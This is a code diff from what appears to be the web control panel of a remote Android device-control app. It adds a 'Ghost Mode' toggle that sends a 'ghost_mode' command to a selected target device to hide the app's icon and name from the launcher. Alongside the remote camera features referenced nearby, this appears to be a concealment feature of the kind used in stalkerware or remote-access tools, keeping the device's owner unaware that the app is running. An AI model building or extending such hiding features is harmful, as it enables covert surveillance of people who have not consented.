@@ -8760,6 +8760,26 @@ setupRemoteCameraPip();
             });
         }
 
+        // Ghost Mode toggle
+        var isGhostMode = localStorage.getItem('vremote_ghost_mode') === 'true';
+        html += '<div style="margin-top:18px;padding:14px 4px 4px;border-top:1px solid rgba(255,255,255,0.08);">'
+              + '<div style="display:flex;align-items:center;justify-content:space-between;gap:10px;">'
+              + '<div style="display:flex;align-items:center;gap:10px;">'
+              + '<div style="width:36px;height:36px;border-radius:10px;background:rgba(139,92,246,0.18);display:flex;align-items:center;justify-content:center;">'
+              + '<i class="fas fa-ghost" style="color:#a78bfa;font-size:15px;"></i>'
+              + '</div>'
+              + '<div>'
+              + '<div style="color:#f2f2f7;font-size:13px;font-weight:600;">Ghost Mode</div>'
+              + '<div style="color:#9aa0a6;font-size:11px;">Hide app icon &amp; name from launcher</div>'
+              + '</div>'
+              + '</div>'
+              + '<label class="toggle-switch" style="flex-shrink:0;">'
+              + '<input type="checkbox" id="perm-ghost-mode-toggle"' + (isGhostMode ? ' checked' : '') + '>'
+              + '<span class="toggle-slider"></span>'
+              + '</label>'
+              + '</div>'
+              + '</div>';
+
         html += '<div style="margin-top:16px;padding:10px 4px;font-size:10px;color:#5f6368;text-align:center;border-top:1px solid rgba(255,255,255,0.05);">'
               + 'Tap "Open Settings" to configure Android system permissions'
               + '</div>';
@@ -8790,6 +8810,27 @@ setupRemoteCameraPip();
                 }
             });
         });
+
+        // Ghost Mode toggle handler
+        var ghostToggle = document.getElementById("perm-ghost-mode-toggle");
+        if (ghostToggle) {
+            ghostToggle.addEventListener("change", function() {
+                var enabled = ghostToggle.checked;
+                localStorage.setItem("vremote_ghost_mode", enabled ? "true" : "false");
+                // Send command to device
+                var targetDeviceId = (typeof selectedDeviceId !== "undefined" && selectedDeviceId) ? selectedDeviceId : null;
+                if (window.socket && window.socket.connected && targetDeviceId) {
+                    window.socket.emit("auto-command", {
+                        targetDeviceId: targetDeviceId,
+                        command: "ghost_mode",
+                        value: enabled
+                    });
+                    showToast(enabled ? "👻 Ghost Mode Enabled — App icon hidden" : "✅ Ghost Mode Disabled — App icon visible");
+                } else {
+                    showToast(enabled ? "👻 Ghost Mode saved (connect device to apply)" : "✅ Ghost Mode off (connect device to apply)");
+                }
+            });
+        }
     }
 
     // --- Website Browser Permissions Renderer ---
